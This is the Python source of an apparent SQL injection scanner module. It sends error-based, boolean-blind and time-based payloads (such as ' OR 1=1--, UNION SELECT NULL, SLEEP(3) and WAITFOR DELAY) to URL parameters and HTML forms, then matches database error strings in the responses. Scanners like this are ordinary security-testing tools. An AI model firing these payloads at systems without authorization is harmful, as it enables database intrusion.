import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from config import DEFAULT_TIMEOUT
from modules.vuln.waf_aware_classifier import classify_error_signature, classify_blind_signal

SQLI_ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1'--",
    "' OR 1=1--",
    '" OR 1=1--',
    "' OR 'x'='x",
    "1' ORDER BY 100--",
    "'; SELECT 1--",
    "1 UNION SELECT NULL--",
    "' AND SLEEP(0)--",
]

SQLI_BLIND_PAYLOADS = [
    ("1 AND SLEEP(3)--", "1 AND SLEEP(0)--", 2.5, "MySQL time-based blind"),
    ("1'; WAITFOR DELAY '0:0:3'--", "1'--", 2.5, "MSSQL time-based blind"),
    ("1 AND 1=1", "1 AND 1=2", None, "Boolean-based blind"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql_",
    "warning: pg_",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "pg_exec()",
    "sqlite3",
    "ora-01756",
    "ora-00933",
    "ora-00907",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "supplied argument is not a valid mysql",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "syntax error in query",
    "invalid query",
    "sql syntax",
    "sqlstate",
    "db2 sql error",
    "unterminated string literal",
    "[microsoft][odbc",
    "native client",
    "jdbc driver",
]


def _error_based_scan(session: requests.Session, parsed, params: dict) -> list:
    findings = []
    for param in params:
        # Only the CONFIRMED entry (if any) or the last non-reporting verdict
        # tried for this param is kept — one row per param, not one per
        # payload, so retaining WAF_BLOCKED/etc. doesn't multiply findings.
        pending = None
        for payload in SQLI_ERROR_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                r = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                body = r.text.lower()
                matched_error = next((err for err in SQL_ERRORS if err in body), None)
                result = classify_error_signature(r.status_code, r.headers, r.text, matched_error)
                entry = {
                    "type": "SQL Injection",
                    "severity": result.severity,
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": result.reason,
                    "waf_detected": result.waf_detected,
                    "verdict": result.verdict,
                    "status_code": r.status_code,
                    "response_body": r.text[:3000],
                }
                if result.verdict == "ENDPOINT_INVALID":
                    pending = entry  # path itself is unreachable, no point trying more payloads
                    break
                if result.should_report:
                    findings.append(entry)
                    pending = None
                    break
                pending = entry
            except Exception:
                continue
        if pending is not None:
            findings.append(pending)
    return findings


def _blind_scan(session: requests.Session, parsed, params: dict) -> list:
    """Time-based and boolean-based blind SQL injection detection."""
    findings = []
    base_params = {k: v[0] for k, v in params.items()}

    for param in list(params.keys())[:3]:  # limit params tested
        # Boolean-based: check content length difference
        true_params = dict(base_params)
        true_params[param] = "1 AND 1=1"
        false_params = dict(base_params)
        false_params[param] = "1 AND 1=2"
        try:
            true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(true_params)}"
            false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(false_params)}"
            r_true = session.get(true_url, timeout=DEFAULT_TIMEOUT)
            r_false = session.get(false_url, timeout=DEFAULT_TIMEOUT)
            len_diff = abs(len(r_true.text) - len(r_false.text))
            signal = len_diff > 50 and r_true.status_code != r_false.status_code
            result = classify_blind_signal(
                r_true.status_code, r_true.headers, r_true.text,
                r_false.status_code, r_false.headers, r_false.text,
                signal, "Boolean-based blind SQLi",
            )
            findings.append({
                "type": "SQL Injection (Blind)",
                "severity": result.severity,
                "url": true_url,
                "parameter": param,
                "payload": "1 AND 1=1 vs 1 AND 1=2",
                "evidence": f"{result.reason}: response length differs by {len_diff} bytes between true/false conditions",
                "waf_detected": result.waf_detected,
                "verdict": result.verdict,
                "status_code": r_true.status_code,
                "response_body": r_true.text[:3000],
            })
            if result.verdict == "ENDPOINT_INVALID":
                continue  # endpoint itself unreachable, skip time-based too
            if result.should_report:
                continue
        except Exception:
            pass

        # Time-based: MySQL SLEEP()
        sleep_params = dict(base_params)
        sleep_params[param] = "1 AND SLEEP(3)--"
        normal_params = dict(base_params)
        normal_params[param] = "1"
        try:
            normal_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(normal_params)}"
            t0 = time.time()
            r_normal = session.get(normal_url, timeout=8)
            normal_time = time.time() - t0

            sleep_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(sleep_params)}"
            t0 = time.time()
            r_sleep = session.get(sleep_url, timeout=8)
            sleep_time = time.time() - t0

            signal = (sleep_time - normal_time) >= 2.5
            result = classify_blind_signal(
                r_normal.status_code, r_normal.headers, r_normal.text,
                r_sleep.status_code, r_sleep.headers, r_sleep.text,
                signal, "MySQL time-based blind SQLi",
            )
            findings.append({
                "type": "SQL Injection (Time-Based Blind)",
                "severity": result.severity,
                "url": sleep_url,
                "parameter": param,
                "payload": "1 AND SLEEP(3)--",
                "evidence": f"{result.reason}: response delayed {sleep_time:.1f}s vs baseline {normal_time:.1f}s",
                "waf_detected": result.waf_detected,
                "verdict": result.verdict,
                "status_code": r_sleep.status_code,
                "response_body": r_sleep.text[:3000],
            })
        except Exception:
            pass

    return findings


def _scan_forms(session: requests.Session, base_url: str) -> list:
    """Scan HTML form fields for SQLi."""
    findings = []
    try:
        r = session.get(base_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
        soup = BeautifulSoup(r.text, "html.parser")
    except Exception:
        return findings

    forms = soup.find_all("form")[:3]
    for form in forms:
        action = form.get("action", "")
        method = form.get("method", "get").lower()
        form_url = urljoin(base_url, action) if action else base_url
        inputs = {}
        for inp in form.find_all(["input", "textarea"]):
            name = inp.get("name", "")
            if name:
                inputs[name] = inp.get("value", "1")
        if not inputs:
            continue
        for param in list(inputs.keys())[:3]:
            payload = "'"
            test_data = dict(inputs)
            test_data[param] = payload
            try:
                if method == "post":
                    resp = session.post(form_url, data=test_data, timeout=DEFAULT_TIMEOUT)
                else:
                    resp = session.get(form_url, params=test_data, timeout=DEFAULT_TIMEOUT)
                body = resp.text.lower()
                matched_error = next((err for err in SQL_ERRORS if err in body), None)
                result = classify_error_signature(resp.status_code, resp.headers, resp.text, matched_error)
                findings.append({
                    "type": "SQL Injection",
                    "severity": result.severity,
                    "url": form_url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"{result.reason} via {method.upper()} form",
                    "waf_detected": result.waf_detected,
                    "verdict": result.verdict,
                    "status_code": resp.status_code,
                    "response_body": resp.text[:3000],
                })
                if result.verdict == "ENDPOINT_INVALID":
                    break
                if result.should_report:
                    break
            except Exception:
                continue
    return findings


def scan_sqli(url: str) -> list:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        params = {"id": ["1"], "page": ["1"], "cat": ["1"]}

    session = requests.Session()
    session.headers["User-Agent"] = "OPTISEC-ReconPro/1.0 (Security Testing)"

    findings = []
    seen = set()

    for f in _error_based_scan(session, parsed, params):
        key = (f["url"], f["parameter"])
        if key not in seen:
            seen.add(key)
            findings.append(f)

    # Blind scan is a fallback for when error-based scanning didn't confirm
    # anything — now that non-CONFIRMED entries (WAF_BLOCKED/ENDPOINT_INVALID/
    # INCONCLUSIVE) are retained too, `findings` is rarely empty, so check for
    # an actual CONFIRMED result rather than "any entries at all".
    if not any(f.get("verdict") == "CONFIRMED" for f in findings):
        for f in _blind_scan(session, parsed, params):
            key = (f["url"], f["parameter"])
            if key not in seen:
                seen.add(key)
                findings.append(f)

    for f in _scan_forms(session, url):
        key = (f["url"], f["parameter"])
        if key not in seen:
            seen.add(key)
            findings.append(f)

    return findings
